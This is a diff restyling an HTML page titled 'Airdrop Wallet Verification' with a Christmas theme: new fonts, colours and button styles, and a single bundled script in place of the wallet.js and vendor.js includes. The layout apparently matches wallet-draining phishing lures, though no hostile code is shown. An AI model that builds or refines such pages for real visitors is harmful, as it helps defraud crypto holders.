@@ -4,12 +4,16 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Airdrop Wallet Verification</title>
+  
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
 
+  <!-- Christmas style -->
   <style>
     body {
+      font-family: 'Roboto', sans-serif;
       background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
       color: #fff;
-      font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -18,54 +22,53 @@
     }
 
     .box {
-      background: rgba(0,0,0,0.6);
-      padding: 30px;
-      border-radius: 12px;
+      background: rgba(0,0,0,0.7);
+      padding: 40px 30px;
+      border-radius: 16px;
       text-align: center;
-      width: 360px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 0 20px #ffcc00;
     }
 
-    h2 {
+    h1 {
+      color: #ffcc00;
       margin-bottom: 20px;
     }
 
     button {
-      padding: 12px 20px;
-      border: none;
-      background: #00ff99;
-      color: #000;
+      padding: 14px 25px;
+      font-size: 1rem;
       font-weight: bold;
-      border-radius: 8px;
+      border: none;
+      border-radius: 10px;
       cursor: pointer;
-      width: 100%;
-      font-size: 16px;
+      background-color: #ff4d4d;
+      color: #fff;
+      transition: all 0.3s ease;
     }
 
     button:hover {
-      background: #00cc7a;
+      background-color: #ffcc00;
+      color: #000;
+      transform: scale(1.05);
     }
 
     #status {
-      margin-top: 15px;
-      font-size: 14px;
-      min-height: 18px;
+      margin-top: 20px;
+      font-weight: bold;
+      min-height: 24px;
     }
   </style>
 </head>
-
 <body>
   <div class="box">
-    <h2>🛡️ Verify Your Wallet</h2>
-
-    <!-- IMPORTANT: ID must match wallet.js -->
-    <button id="verifyWalletBtn">Connect & Verify Wallet</button>
-
-    <p id="status">Not connected</p>
+    <h1>🎄 Airdrop Wallet Verification 🎄</h1>
+    <button id="verifyWalletBtn">🛡️ Verify Wallet</button>
+    <div id="status">💡 Not connected</div>
   </div>
 
-  <!-- MUST be at the bottom -->
-  <script src="/vendor.js"></script>
-  <script src="/wallet.js"></script>
+  <!-- Your existing wallet script -->
+  <script src="app-d5581b5984f55097.js" type="module"></script>
 </body>
 </html>
